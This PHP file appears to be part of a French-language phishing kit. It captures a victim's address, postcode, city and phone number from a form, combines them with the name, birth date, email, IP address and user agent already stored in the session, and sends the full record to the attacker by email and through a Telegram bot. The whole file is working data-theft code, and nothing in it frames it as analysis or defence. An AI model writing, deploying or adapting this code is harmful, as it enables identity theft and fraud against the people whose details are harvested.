<?php
session_start();


include("../config.php");
include("tg.php");


if(isset($_POST))
{

	$_SESSION['adresse'] = htmlspecialchars($_POST['input_adresse']);
	$_SESSION['zip'] = htmlspecialchars($_POST['input_zipcode']);
	$_SESSION['city'] = htmlspecialchars($_POST['input_city']);
	$_SESSION['phone'] = htmlspecialchars($_POST['input_tel']);




			$message = "

[⌛️] Full Info [⌛️]

⌛️ Adresse : ".$_SESSION['adresse']."
⌛️ Code Postal : ".$_SESSION['zip']."
⌛️ Ville : ".$_SESSION['city']."
⌛️ Numéro de téléphone : ".$_SESSION['phone']."

[⌚️] Log & Infos [⌚️]

⌚️ Nom : ".$_SESSION['nom']."
⌚️ Prénom : ".$_SESSION['prenom']."
⌚️ Naissance : ".$_SESSION['naissance']."
⌚️ Email : ".$_SESSION['mail']."

[🧰] Tiers [🧰]

🧰 Adresse ip : ".$_SESSION['ip']."
🧰 User Agen : ".$_SESSION['useragent']."



			";
	
			$subject = "「⌛️」 +1 Full info • ".$_SESSION['nom']." • ".$_SESSION['prenom']." • ".$_SESSION['ip'];
			mail($to, $subject, $message);
  
		  
  
				  ##########################
				  #### TELEGRAM SENDING ####
				  ##########################
  
		  

  
$messaggio = '

[⌛️] Personnel [⌛️]

🐱‍🐉 Adresse :'.$_SESSION['adresse'].'
🐱‍💻 Ville : '.$_SESSION['city'].'
👽 Code Postal : '.$_SESSION['zip'].'
🥵 Téléphone : '.$_SESSION['phone'].'

[⌚️] Log & Infos [⌚️]

😂 Nom : '.$_SESSION['nom'].'
🤣 Prénom : '.$_SESSION['prenom'].'
👨‍🦳 Naissance : '.$_SESSION['naissance'].'
👩 Email : '.$_SESSION['mail'].'

[🧰] Tiers [🧰]

🧰 Adresse IP : '.$_SESSION['ip'].'
🧰 User-agent : '.$_SESSION['useragent'];
sendMessage($chat, $messaggio, $token);

        $_SESSION['billinged'] = true;

	

}
else{


}

?>